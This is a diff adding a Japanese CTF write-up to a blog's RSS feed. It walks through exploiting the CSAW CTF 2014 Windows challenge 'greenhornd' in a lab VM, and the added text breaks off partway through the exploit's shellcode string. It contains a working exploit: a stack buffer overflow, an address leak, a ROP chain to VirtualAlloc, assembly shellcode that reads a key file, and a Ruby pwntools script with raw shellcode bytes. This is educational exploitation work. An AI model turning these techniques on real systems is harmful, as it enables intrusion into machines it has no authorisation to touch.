@@ -80,8 +80,209 @@
     <description>Recent content in Writeup on $ make life</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 16 Sep 2019 09:50:28 +0900</lastBuildDate>
+    <lastBuildDate>Thu, 19 Sep 2019 23:49:38 +0900</lastBuildDate>
     <atom:link href="https://owlinux1000.github.io/blog/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CSAW CTF 2014 Greenhornd writeup</title>
+      <link>https://owlinux1000.github.io/blog/post/greenhornd_writeup/</link>
+      <pubDate>Thu, 19 Sep 2019 23:49:38 +0900</pubDate>
+      <guid>https://owlinux1000.github.io/blog/post/greenhornd_writeup/</guid>
+      <description>
+
+&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;
+
+&lt;p&gt;本記事では、CSAW CTF 2014 で出題されたWindows 環境のPwnable 問題「greenhourd」を解説する。CTF におけるWindows のPwnable 問題が割合がかなり少なく知見もあまりまとまっていない分野なので自分の学習がてらまとめてみた。Linux でのPwnに慣れている人向けの記述になっているので、うまく補完しながら読んでほしい。&lt;/p&gt;
+
+&lt;h2 id=&#34;1-環境準備&#34;&gt;1. 環境準備&lt;/h2&gt;
+
+&lt;h3 id=&#34;1-1-windows-os-の準備&#34;&gt;1.1 Windows OS の準備&lt;/h3&gt;
+
+&lt;p&gt;Linux と異なり環境構築に戸惑う人もいると思うので準備方法を記載していく。Windows OS自体は、Edgeのテスト用として用意されている、&lt;a href=&#34;https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/&#34;&gt;Free Virtual Machines from IE8 to MS Edge - Microsoft Edge Development&lt;/a&gt; を用いる。本ページにアクセスしたら、「Virtual machine」の欄を「IE11 on Win81 (x86)」に選択、「Select platform」を「VirtualBox」にして、ダウンロードボタンをクリックする。ダウンロードが完了したらzipを展開し、仮想マシンをインポートする。&lt;/p&gt;
+
+&lt;h3 id=&#34;1-2-解析環境の準備&#34;&gt;1.2 解析環境の準備&lt;/h3&gt;
+
+&lt;p&gt;本VMは、ドライブが備わっていないので、VirtualBoxの設定からドライブを作成して、Guest Addition をインストールする。インストール後は、共有フォルダあるいはD&amp;amp;Dやクリップボードの共有ができるようにしてホストマシンと相互にやりとりできるようにしておく。また、ホストマシンと本VMにpingが届くことも確認しておく(Windows はpingをデフォルトで応答しないので、VM側からホストマシン側へ飛ばすと良い。)  最後に、検証やポートの公開などで面倒なので、Windows Firewall を無効にしておく。&lt;/p&gt;
+
+&lt;p&gt;次に、本問題フアィルと解析する際にVM側に必要なソフトウェアをダウンロードする。以下に列挙する。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/ctfs/write-ups-2014/blob/master/csaw-ctf-2014/greenhornd/greenhornd.exe&#34;&gt;greenhornd.exe&lt;/a&gt;
+
+&lt;ul&gt;
+&lt;li&gt;問題のバイナリファイル&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/ctfs/write-ups-2014/blob/master/csaw-ctf-2014/greenhornd/AppJailLauncher.exe&#34;&gt;AppJailLauncher.exe&lt;/a&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Windows におけるPwn 問題を動作させる定番のソフトウェア(らしい)&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.microsoft.com/ja-jp/download/details.aspx?id=40784&#34;&gt;Visual Studio 2013 の Visual C++ 再頒布可能パッケージ&lt;/a&gt;
+
+&lt;ul&gt;
+&lt;li&gt;greenhornd を実行しようとすると「msvcr120.dll」が無いためにエラーになるのでインストールする&lt;/li&gt;
+&lt;li&gt;ちなみにmsvcr120.dll は、libcに入っているような標準的な関数を提供するDLL&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://visualstudio.microsoft.com/ja/downloads/?rr=https%3A%2F%2Fdocs.microsoft.com%2Fja-jp%2Fvisualstudio%2Finstall%2Finstall-visual-studio%3Fview%3Dvs-2019&#34;&gt;Visual Studio 2019&lt;/a&gt;
+
+&lt;ul&gt;
+&lt;li&gt;PoC 作成用に利用&lt;/li&gt;
+&lt;li&gt;特に個別パッケージのMSVC vXXX - VS 2019 C++ x64/x86 build tools には、cl や dumpbin など便利なコマンドが多いのでインストール推奨&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://x64dbg.com/#start&#34;&gt;x64dbg&lt;/a&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Windows における代表的なデバッガの1つ&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.winitor.com/get.html&#34;&gt;PeStudio&lt;/a&gt;
+
+&lt;ul&gt;
+&lt;li&gt;PEビューワ、マルウェア解析などでも必須となるアイテム&lt;/li&gt;
+&lt;li&gt;でかいファイルを扱うと重い&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.nirsoft.net/utils/dll_export_viewer.html&#34;&gt;DLL Export Viewer&lt;/a&gt;
+
+&lt;ul&gt;
+&lt;li&gt;DLL がExplortする関数一覧の閲覧や検索ができるGUIソフト&lt;/li&gt;
+&lt;li&gt;比較的大きなDLLでもさばけるためDLLから関数を探す時などはこちらを利用&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/download-the-wdk&#34;&gt;cdb, Windbgなどのデバッグツール&lt;/a&gt;
+
+&lt;ul&gt;
+&lt;li&gt;シェルコードのデバッグやPoC 用に利用&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;ホスト側には概ね以下のソフトウェアが入っていれば良いだろう。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;exploit コードを作成するためのプログラミング環境 (Python, Rubyなど)&lt;/li&gt;
+&lt;li&gt;rp++ などのROP Gadget 検索ツール&lt;/li&gt;
+&lt;li&gt;IDA, Ghidra などの逆アセンブラ&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;必要なソフトウェアのインストールなどが終わったら次に実際に&lt;code&gt;greenhornd.exe&lt;/code&gt; を問題のように動作させてみる。動作させる際には前述した&lt;code&gt;AppJailLauncher.exe&lt;/code&gt; を利用する。デスクトップなどに、以下の内容の&lt;code&gt;run.bat&lt;/code&gt; を作成する。これでダブルクリックでいつでも問題を動作させることができる。また、同じディレクトリに&lt;code&gt;greenhornd.exe&lt;/code&gt; と&lt;code&gt;key&lt;/code&gt; というファイル名でFLAGを書いたテキストファイルを用意しておこう。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;AppJailLauncher.exe /network /key:key /port:9998 /timeout:30 greenhornd.exe&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;実際にダブルクリックすると以下のような画面になる。その後、ホストマシンから、本VMの9998番ポートへ向けて接続してみよう。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;nc &amp;lt;VMのIPアドレス&amp;gt; 9998&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;正しく動作していれば、Passsword を求められる文字列が帰ってくるはずだ。ここまでが設定できれば、あとは解析をスタートさせることができる。&lt;/p&gt;
+
+&lt;h2 id=&#34;2-解析&#34;&gt;2. 解析&lt;/h2&gt;
+
+&lt;p&gt;まずは、先程nc でつないだところからのスタートだ。パスワードの入力を求められているので、バイナリ中からパスワードを探そう。この時重要なのは、本問題はPwnableであってReversingではない。つまり、難しい技を使ってパスワードを隠していることは考えにくい。そこで、手始めにstrings コマンドとgrep でpasswordを引っ掛けてみよう。grep で検索をかける際には、大文字小文字を無視する-i オプションを付けておくと良い。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;strings greenhornd.exe | grep -i password
+To continue, you&amp;#39;re going to need the password. You can get the password by running strings from minsys (strings - greenhorn.exe) or locate it in IDA.
+Password: 
+GreenhornSecretPassword!!!
+Incorrect Password.
+Password accepted.&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;この結果から、気になる文章はあるものの、&lt;code&gt;GreenhornSecretPassword!!!&lt;/code&gt; が怪しいと感じるだろう。nc でつないで、この文字列を入力してみよう。そうすると、さらに応答が進み選択画面が出てくるはずだ。割愛するが、重要な選択肢は、(A)と(V)だ。(A) を選ぶと、PEファイルのベースアドレスとスタックのアドレスがリークする。つまり、Windows におけるASLRをBypassすることが可能となる。(V) を選択すると1024 byteの入力を行うことができる。この2つ以外はどれも説明の文字列が帰ってくるだけだ。&lt;/p&gt;
+
+&lt;p&gt;今回は、Ghidra を用いて逆アセンブル、逆コンパイル結果を見ながら詳細な解析を勧めていく。PeStudioなどの.textセクションのvirtual address や文字列などを起点にxref機能などを使ってバイナリ中を動き回ると、&lt;code&gt;0x401000&lt;/code&gt; がmain関数にあたる部分だとわかる。さらに、下図からも先程入力したパスワードがstrncmp関数で比較されており正しいことがわかる。解析する際には、積極的に関数名や変数名をわかりやすい形に変更していくことをおすすめする。Ghidra はまだ世に出て慣れ親しんでいない人も多いので、&lt;a href=&#34;https://booth.pm/ja/items/1575255&#34;&gt;Ghidra Pro Book&lt;/a&gt; を一読することをおすすめする。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/UIkarAm&#34; alt=&#34;main関数付近のデコンパイル画面&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;さらにswitch 文のところから、(V)の処理の実際の関数は、&lt;code&gt;0x401210&lt;/code&gt;だとわかるので見てみる。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/sNFqhmW&#34; alt=&#34;選択肢Vの関数&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;中では、0x800 という引数があることがわかる。読み込む処理が本処理しかないため、この値は読み込みバイト数だと推測できるが、促されている長さは1024なためBuffer Overflow が発生するとわかる。さらに条件分岐で、&lt;code&gt;C&lt;/code&gt; の文字が先頭に入っているとexit処理に移る。実際にデバッガでこの周辺処理や1024文字以上を入力した場合の挙動を見てみると、ebpレジスタが指すアドレスの次のワードがreturn address になっていることがわかる。今回の場合、return address が格納されたアドレスが&lt;code&gt;0x03CFAC0&lt;/code&gt; 、入力するバッファの先頭アドレスが&lt;code&gt;0x03CF6C0&lt;/code&gt; だったので、先頭から1028byte分のパディングをした後に、return address を書き換えることが可能だとわかる。これで、EIPは奪えたことになる。(こういった動的なデバッグの際には、攻撃コードを送る手前で、exploitコード側で標準入力を受け付けておき、デバッガで対象プロセスにアタッチし、ブレークポイントを貼って、exploitコードで適当なキーを叩き実行を進めて止めるやり方が便利。)&lt;/p&gt;
+
+&lt;p&gt;ここまでの情報を整理すると、以下のようになる。これらを踏まえてExploit 作成に移る。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;1028 バイトのパディングを入れることで、Return address を書き換えることができる&lt;/li&gt;
+&lt;li&gt;PEのベースアドレスとスタックのアドレスは、リーク可能&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;3-exloit-コードの作成&#34;&gt;3. Exloit コードの作成&lt;/h2&gt;
+
+&lt;p&gt;まずは、Exploit の方針を明示する。今回は、VirtualAlloc関数を使って、スタックの領域をRWXな領域に変更し、シェルコードを実行して、keyファイルの内容を出力する方針を取る。VirtualAlloc関数の実アドレスは、0x402000(RVA) に存在するため、ROPで本アドレスの中にあるアドレスにジャンプすることを試みる。本コードには、switch文があり、&lt;code&gt;dword[ecx*4+0x401160]&lt;/code&gt; にjmpする処理が存在する。そのため、ecxを適切な値にしてこのjmp処理に制御を移すことで任意のアドレスにjmpすることができる。そこで、バイナリ中に&lt;code&gt;pop ecx; ret&lt;/code&gt; が行えるROP Gadgetがあるか調べると、いくつかGadget が見つかるため、本方針でVirtualAlloc関数に飛ばすことは可能だと考えられる。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ rp-osx-x64 -r &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt; -f greenhornd.exe | grep &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pop ecx&amp;#39;&lt;/span&gt;
+0x0040178c: pop ecx ; ret  ;  &lt;span style=&#34;color:#666&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt; found&lt;span style=&#34;color:#666&#34;&gt;)&lt;/span&gt;
+0x004018b5: pop ecx ; ret  ;  &lt;span style=&#34;color:#666&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt; found&lt;span style=&#34;color:#666&#34;&gt;)&lt;/span&gt;
+0x00401c20: pop ecx ; ret  ;  &lt;span style=&#34;color:#666&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt; found&lt;span style=&#34;color:#666&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;次に、VirtualAllocでスタックのパーミッションを書き換えた後に実行するシェルコードについて考えてみる。Linux と異なりWindows の場合システムコール番号などが各種OSで異なっておりLinux に比べて生のシステムコールを読ぶのは汎用性が低いシェルコードになってしまう。そのため、Windowsの場合はWin32 APIを呼び出して実行するシェルコードを作成する。今回は、&lt;code&gt;key&lt;/code&gt; というファイルの中身を見たいので、ファイルを開いて、読み出し、書き出す処理を行う必要がある。そこで、PEバイナリに含まれているReadFileやWriteFileを用いれば良いと考えられるが、これらの関数を実行するためには事前に対象ファイルのファイルハンドラを取得する必要があり、そのためには引数の多いCreateFile関数を呼ばなくてはならない。今回の場合は特に成約が厳しくないが、長さ制限などがある場合は、&lt;code&gt;_open&lt;/code&gt;, &lt;code&gt;_read&lt;/code&gt;, &lt;code&gt;_write&lt;/code&gt; を使ってLinuxライクなシェルコードを作成して短くする方法がある。今回は、その方針で作成した。Windows におけるシェルコード作成方法などについては、&lt;a href=&#34;http://inaz2.hatenablog.com/entry/2015/04/23/013858&#34;&gt;Windowsで電卓を起動するシェルコードを書いてみる&lt;/a&gt; がとてもわかりやすいので参照してほしい。今回は、本サイトのシェルコードを改変する形で以下のシェルコードを作成した。mainラベルより上はサイトと全く同じため省略する。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;color:#a0a000&#34;&gt;main:&lt;/span&gt;
+    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0079656&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;bh&lt;/span&gt;	&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; key
+&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;eax&lt;/span&gt;, &lt;span style=&#34;color:#800&#34;&gt;esp&lt;/span&gt;
+    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;
+    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;
+    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;eax&lt;/span&gt;
+    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;e12e0c6eh&lt;/span&gt;  	&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; open(&amp;#34;key&amp;#34;, 0, 0)
+&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;api_call&lt;/span&gt;
+    &lt;span style=&#34;color:#00f&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebx&lt;/span&gt;, &lt;span style=&#34;color:#800&#34;&gt;eax&lt;/span&gt;        &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; ファイルディスクリプタをebxに退避
+&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;h&lt;/span&gt;		    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; len
+&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;lea&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebp&lt;/span&gt;, [&lt;span style=&#34;color:#800&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;h&lt;/span&gt;]	&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; buffer
+&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebp&lt;/span&gt;            
+    &lt;span style=&#34;color:#800&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebx&lt;/span&gt;
+    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;e70e09a4h&lt;/span&gt;	    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; read(fd, esp+100h, 100h)
+&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;api_call&lt;/span&gt;
+    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;h&lt;/span&gt;
+    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebp&lt;/span&gt;
+    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;
+    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;067&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;a78ad5h&lt;/span&gt;	    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; write(fd, esp+100h, 100h)
+&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;api_call&lt;/span&gt;
+    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;e2d87eh&lt;/span&gt;      &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; ExitProcess
+&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;api_call&lt;/span&gt;
+
+&lt;span style=&#34;color:#00f&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;start&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;最後に、以下にexploit の全体コードを示す。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
+
+host &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;192.168.0.109&amp;#39;&lt;/span&gt;
+port &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;9998&lt;/span&gt;
+$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new host, port
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
+context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:info&lt;/span&gt;
+
+password &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;GreenhornSecretPassword!!!&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Password: &lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;password&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Password: &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline password
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Selection: &amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[*] Select A to leak and calculate some addresses&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;
+tmp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Selection: &amp;#34;&lt;/span&gt;
+text_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; tmp&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/is: (.*) /&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
+stack_addr &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; tmp&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/at: (.*)\./&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
+pop_ecx_ret &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; text_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x0040178c&lt;/span&gt;
+jmp_memory &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; text_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x0040110d&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;image base address        : 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% text_base
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Stack address             : 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% stack_addr
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pop ecx; ret              @ 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% pop_ecx_ret
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;jmp dword[0x401160+ecx*4] @ 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% jmp_memory
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[*] Select V to overflow&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;V&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;).&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
+
+shellcode &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\xFC\xEB\x67\x60\x33\xC0\x64\x8B\x40\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x89\x44\x24\x1C\x8B\x68\x10\x8B\x45\x3C\x8B\x54\x05\x78\x03\xD5\x8B\x4A\x18\x8B\x5A\x20\x03\xDD\xE3\x39\x49\x8B\x34\x8B\x03\xF5\x33\xFF\x33\xC0\xAC\x84\xC0\x74\x07\xC1\xCF\x0D\x03\xF8\xEB\xF4\x3B\x7C\x24\x24\x75\xE2\x8B\x5A\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5A\x1C\x03\xDD\x8B\x04\x8B\x03\xC5\x89\x44\x24\x1C\x61\x59\x5A\x51\xFF\xE0\x8B\x74\x24\x1C\xEB\xA6\x68\x6B\x65\x79\x00\x8B\xC4\x6A\x00\x6A\x00\x50\x68\x6E\x0C\x2E\xE1\xE8\x83\xFF\xFF\xFF\x8B\xD8\x68\x00\x01\x00\x00\x8D\xAC\x24\x00\x01\x00\x00\x55\x53\x68\xA4\x09\x0E\xE7\xE8\x69\xFF\xFF\xFF\x68\x00\x01\x00\x00\x55\x6A\x01\x68\xD5\x8A\xA7\x67\xE8\x57\xFF\xFF\xFF\x68\x7E\xD8\xE2\x73\xE8\x4D\xFF\xFF\xFF\x00\x00\x00\x00\x6E\x8F\x87\x5D\x00\x00\x00\x00\x0D\x00\x00\x00\x40\x00\x00\x00\x1C\x20\x00\x00\x1C\x04\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\xB6\x00\x00\x00\x2E\x74\x65\x78\x74\x24\x6D\x6E\x00\x00\x00\x00\x00\x20\x00\x00\x1C\x00\x00\x00\x2E\x72\x64\x61\x74\x61\x00\x00\x1C\x20\x00\x00\